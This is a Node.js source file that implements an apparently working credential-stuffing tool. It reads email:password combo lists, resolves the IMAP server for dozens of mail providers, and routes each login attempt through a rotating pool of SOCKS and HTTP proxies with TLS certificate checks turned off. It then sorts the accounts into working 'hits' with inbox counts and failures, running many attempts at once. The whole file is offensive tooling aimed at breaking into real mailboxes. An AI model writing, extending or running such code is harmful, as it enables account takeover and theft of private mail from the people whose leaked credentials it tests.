const { ImapFlow } = require('imapflow');
const { SocksClient } = require('socks');
const tls = require('tls');
const net = require('net');

const PRESETS = {
  'gmail.com': { host: 'imap.gmail.com', port: 993, secure: true },
  'googlemail.com': { host: 'imap.gmail.com', port: 993, secure: true },
  'yahoo.com': { host: 'imap.mail.yahoo.com', port: 993, secure: true },
  'ymail.com': { host: 'imap.mail.yahoo.com', port: 993, secure: true },
  'rocketmail.com': { host: 'imap.mail.yahoo.com', port: 993, secure: true },
  'aol.com': { host: 'imap.aol.com', port: 993, secure: true },
  'outlook.com': { host: 'imap-mail.outlook.com', port: 993, secure: true },
  'hotmail.com': { host: 'imap-mail.outlook.com', port: 993, secure: true },
  'live.com': { host: 'imap-mail.outlook.com', port: 993, secure: true },
  'msn.com': { host: 'imap-mail.outlook.com', port: 993, secure: true },
  'mail.ru': { host: 'imap.mail.ru', port: 993, secure: true },
  'yandex.ru': { host: 'imap.yandex.ru', port: 993, secure: true },
  'yandex.com': { host: 'imap.yandex.com', port: 993, secure: true },
  'libero.it': { host: 'imapmail.libero.it', port: 993, secure: true },
  'inwind.it': { host: 'imapmail.libero.it', port: 993, secure: true },
  'iol.it': { host: 'imapmail.libero.it', port: 993, secure: true },
  'blu.it': { host: 'imapmail.libero.it', port: 993, secure: true },
  'web.de': { host: 'imap.web.de', port: 993, secure: true },
  'gmx.de': { host: 'imap.gmx.net', port: 993, secure: true },
  'gmx.net': { host: 'imap.gmx.net', port: 993, secure: true },
  'gmx.at': { host: 'imap.gmx.net', port: 993, secure: true },
  'gmx.ch': { host: 'imap.gmx.net', port: 993, secure: true },
  'rambler.ru': { host: 'imap.rambler.ru', port: 993, secure: true },
  'seznam.cz': { host: 'imap.seznam.cz', port: 993, secure: true },
  'email.cz': { host: 'imap.seznam.cz', port: 993, secure: true },
  'centrum.cz': { host: 'imap.centrum.cz', port: 993, secure: true },
  'atlas.cz': { host: 'imap.centrum.cz', port: 993, secure: true },
  'volny.cz': { host: 'imap.volny.cz', port: 993, secure: true },
  'icloud.com': { host: 'imap.mail.me.com', port: 993, secure: true },
  'me.com': { host: 'imap.mail.me.com', port: 993, secure: true },
  'mac.com': { host: 'imap.mail.me.com', port: 993, secure: true },
  'protonmail.com': { host: 'imap.protonmail.ch', port: 993, secure: true },
  'proton.me': { host: 'imap.protonmail.ch', port: 993, secure: true },
  'zoho.com': { host: 'imap.zoho.com', port: 993, secure: true },
  'fastmail.com': { host: 'imap.fastmail.com', port: 993, secure: true },
};

const OUTLOOK_BASES = ['hotmail', 'outlook', 'live', 'msn', 'windowslive'];
const YAHOO_BASES = ['yahoo', 'ymail', 'rocketmail'];

function resolveServer(domain) {
  const lower = domain.toLowerCase();
  if (PRESETS[lower]) return PRESETS[lower];
  const base = lower.split('.')[0];
  if (OUTLOOK_BASES.includes(base)) return { host: 'imap-mail.outlook.com', port: 993, secure: true };
  if (YAHOO_BASES.includes(base)) return { host: 'imap.mail.yahoo.com', port: 993, secure: true };
  return { host: 'imap.' + lower, port: 993, secure: true };
}

function parseProxyLine(line) {
  let s = line.trim();
  if (!s) return null;
  let type = null, host, port, user, pass;

  const protoMatch = s.match(/^(socks5|socks4|https?|socks):\/\//i);
  if (protoMatch) {
    const proto = protoMatch[1].toLowerCase();
    if (proto === 'socks5' || proto === 'socks') type = 'socks5';
    else if (proto === 'socks4') type = 'socks4';
    else type = 'http';
    s = s.substring(protoMatch[0].length);
  }

  if (s.includes('@')) {
    const atIdx = s.lastIndexOf('@');
    const credPart = s.substring(0, atIdx);
    const hostPart = s.substring(atIdx + 1);
    const credSep = credPart.indexOf(':');
    if (credSep > 0) {
      user = credPart.substring(0, credSep);
      pass = credPart.substring(credSep + 1);
    }
    const hostParts = hostPart.split(':');
    host = hostParts[0];
    port = parseInt(hostParts[1]);
  } else {
    const parts = s.split(':');
    if (parts.length < 2) return null;
    host = parts[0];
    port = parseInt(parts[1]);
    if (parts.length >= 4) {
      user = parts[2];
      pass = parts.slice(3).join(':');
    }
  }

  if (!host || !port || isNaN(port)) return null;

  if (!type) {
    const socksPorts = [1080, 1081, 4145, 9050, 9150];
    if (socksPorts.includes(port)) type = 'socks5';
    else type = 'http';
  }

  return { type, host, port, user: user || null, pass: pass || null, failStreak: 0, isDead: false };
}

class ProxyPool {
  constructor(lines) {
    this.proxies = lines.map(parseProxyLine).filter(Boolean);
    this.index = 0;
  }
  get alive() { return this.proxies.filter(p => !p.isDead).length; }
  get total() { return this.proxies.length; }
  stats() {
    const byType = { socks5: 0, socks4: 0, http: 0 };
    for (const p of this.proxies) { if (!p.isDead) byType[p.type] = (byType[p.type] || 0) + 1; }
    return byType;
  }
  next() {
    if (this.proxies.length === 0) return null;
    const len = this.proxies.length;
    for (let i = 0; i < len; i++) {
      const idx = (this.index + i) % len;
      if (!this.proxies[idx].isDead) { this.index = (idx + 1) % len; return this.proxies[idx]; }
    }
    // All dead? Resurrect all
    for (const p of this.proxies) { p.isDead = false; p.failStreak = 0; }
    this.index = 0;
    return this.proxies[0];
  }
  markFail(p) {
    p.failStreak++;
    // Never mark dead if only 1 proxy
    if (this.proxies.length > 1 && p.failStreak >= 20) p.isDead = true;
  }
  markSuccess(p) { p.failStreak = 0; }
}

// ========== CONNECTION LIMITER ==========
class Semaphore {
  constructor(max) {
    this.max = max;
    this.current = 0;
    this.queue = [];
  }
  async acquire() {
    if (this.current < this.max) {
      this.current++;
      return;
    }
    return new Promise(resolve => this.queue.push(resolve));
  }
  release() {
    this.current--;
    if (this.queue.length > 0) {
      this.current++;
      this.queue.shift()();
    }
  }
}

// ========== PROXY CONNECTORS ==========

async function connectSocks(proxy, targetHost, targetPort, timeoutMs) {
  const opts = {
    proxy: { host: proxy.host, port: proxy.port, type: proxy.type === 'socks4' ? 4 : 5 },
    command: 'connect',
    destination: { host: targetHost, port: targetPort },
    timeout: timeoutMs,
  };
  if (proxy.user) { opts.proxy.userId = proxy.user; opts.proxy.password = proxy.pass; }
  const info = await SocksClient.createConnection(opts);
  return info.socket;
}

async function connectHttp(proxy, targetHost, targetPort, timeoutMs) {
  return new Promise((resolve, reject) => {
    const timer = setTimeout(() => { sock.destroy(); reject(new Error('HTTP CONNECT timeout')); }, timeoutMs);
    const sock = net.createConnection({ host: proxy.host, port: proxy.port, timeout: timeoutMs }, () => {
      let connectReq = 'CONNECT ' + targetHost + ':' + targetPort + ' HTTP/1.1\r\n';
      connectReq += 'Host: ' + targetHost + ':' + targetPort + '\r\n';
      if (proxy.user && proxy.pass) {
        const auth = Buffer.from(proxy.user + ':' + proxy.pass).toString('base64');
        connectReq += 'Proxy-Authorization: Basic ' + auth + '\r\n';
      }
      connectReq += 'Connection: keep-alive\r\n';
      connectReq += '\r\n';
      sock.write(connectReq);
    });
    sock.on('timeout', () => { sock.destroy(); reject(new Error('TCP timeout')); });
    let data = '';
    sock.on('data', (chunk) => {
      data += chunk.toString();
      if (data.includes('\r\n\r\n')) {
        clearTimeout(timer);
        const statusLine = data.split('\r\n')[0];
        if (statusLine.includes('200')) {
          sock.removeAllListeners('data');
          sock.removeAllListeners('timeout');
          resolve(sock);
        } else {
          sock.destroy();
          reject(new Error('HTTP CONNECT ' + statusLine));
        }
      }
    });
    sock.on('error', (err) => { clearTimeout(timer); reject(err); });
  });
}

async function connectViaProxy(proxy, targetHost, targetPort, timeoutMs) {
  // Try primary type first, fallback to other
  try {
    if (proxy.type === 'http') {
      return await connectHttp(proxy, targetHost, targetPort, timeoutMs);
    }
    return await connectSocks(proxy, targetHost, targetPort, timeoutMs);
  } catch (firstErr) {
    // Fallback: try other protocol
    try {
      if (proxy.type === 'http') {
        return await connectSocks({ ...proxy, type: 'socks5' }, targetHost, targetPort, timeoutMs);
      }
      return await connectHttp(proxy, targetHost, targetPort, timeoutMs);
    } catch {
      throw firstErr;
    }
  }
}

function parseAccount(line) {
  const s = line.trim();
  if (!s || !s.includes('@')) return null;
  const atPos = s.indexOf('@');
  const afterAt = s.substring(atPos + 1);
  const sepIdx = afterAt.search(/[:;|]/);
  if (sepIdx < 0) return null;
  const email = s.substring(0, atPos + 1 + sepIdx);
  const password = afterAt.substring(sepIdx + 1).trim();
  if (!email || !password) return null;
  return { email, password };
}

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

async function validateOne(email, password, proxy, timeoutMs) {
  const domain = email.split('@')[1];
  if (!domain) return { status: 'BAD', reason: 'no domain' };

  const server = resolveServer(domain);
  const imapOpts = {
    host: server.host, port: server.port, secure: server.secure,
    auth: { user: email, pass: password },
    tls: { rejectUnauthorized: false },
    logger: false,
    greetingTimeout: timeoutMs, socketTimeout: timeoutMs,
  };

  if (proxy) {
    try {
      const sock = await connectViaProxy(proxy, server.host, server.port, timeoutMs);
      if (server.secure) {
        const tlsSock = tls.connect({ socket: sock, host: server.host, servername: server.host, rejectUnauthorized: false });
        await new Promise((res, rej) => {
          tlsSock.once('secureConnect', res);
          tlsSock.once('error', rej);
          setTimeout(() => rej(new Error('TLS timeout')), timeoutMs);
        });
        imapOpts.socket = tlsSock; imapOpts.secure = true;
      } else {
        imapOpts.socket = sock;
      }
    } catch (err) {
      return { status: 'EXC', reason: 'proxy: ' + err.message, proxyFail: true };
    }
  }

  const client = new ImapFlow(imapOpts);
  try {
    await client.connect();
    let inbox = 0;
    try { const st = await client.status('INBOX', { messages: true }); inbox = st.messages || 0; } catch {}
    try { await client.logout(); } catch {}
    return { status: 'HIT', inbox };
  } catch (err) {
    try { client.close(); } catch {}
    const msg = (err.message || '').toLowerCase();
    if (msg.includes('auth') || msg.includes('login') || msg.includes('invalid') ||
        msg.includes('credentials') || msg.includes('no access') || msg.includes('incorrect') ||
        msg.includes('failed') || msg.includes('authentication') || msg.includes('denied') ||
        msg.includes('rejected') || msg.includes('disabled') || msg.includes('blocked')) {
      return { status: 'BAD', reason: err.message };
    }
    return { status: 'EXC', reason: err.message };
  }
}

const MAX_RETRIES = 3;

async function runValidation(lines, proxyLines, concurrency, onProgress) {
  const accounts = lines.map(parseAccount).filter(Boolean);
  const proxyPool = new ProxyPool(proxyLines);
  const results = { hit: [], bad: [], exc: [], total: accounts.length, retried: 0 };
  let processed = 0;
  const queue = [...accounts];

  // Limit concurrent proxy connections (proxy max = 100, keep headroom)
  const maxConn = proxyPool.total > 0 ? Math.min(concurrency, 80) : concurrency;
  const sem = new Semaphore(maxConn);

  async function worker() {
    while (queue.length > 0) {
      const acc = queue.shift();
      if (!acc) break;

      await sem.acquire();

      let res;
      let attempts = 0;

      while (attempts < MAX_RETRIES) {
        attempts++;
        const proxy = proxyPool.next();
        try { res = await validateOne(acc.email, acc.password, proxy, 15000); }
        catch (err) { res = { status: 'EXC', reason: err.message }; }

        if (proxy) {
          if (res.proxyFail) proxyPool.markFail(proxy);
          else proxyPool.markSuccess(proxy);
        }

        if (res.status === 'HIT' || res.status === 'BAD') break;

        if (attempts < MAX_RETRIES) {
          results.retried++;
          await sleep(1000 + Math.random() * 2000);
        }
      }

      sem.release();

      const combo = acc.email + ':' + acc.password;
      if (res.status === 'HIT') results.hit.push(combo + ' | INBOX: ' + (res.inbox || 0));
      else if (res.status === 'BAD') results.bad.push(combo);
      else results.exc.push(combo);

      processed++;
      if (onProgress) onProgress(processed, results, proxyPool);
    }
  }

  const workerCount = Math.min(concurrency, accounts.length);
  const workers = [];
  for (let i = 0; i < workerCount; i++) {
    workers.push(worker());
    if (proxyPool.total > 0) await sleep(50);
  }
  await Promise.all(workers);
  return results;
}

module.exports = { validateOne, runValidation, ProxyPool, parseProxyLine, resolveServer, parseAccount, PRESETS };
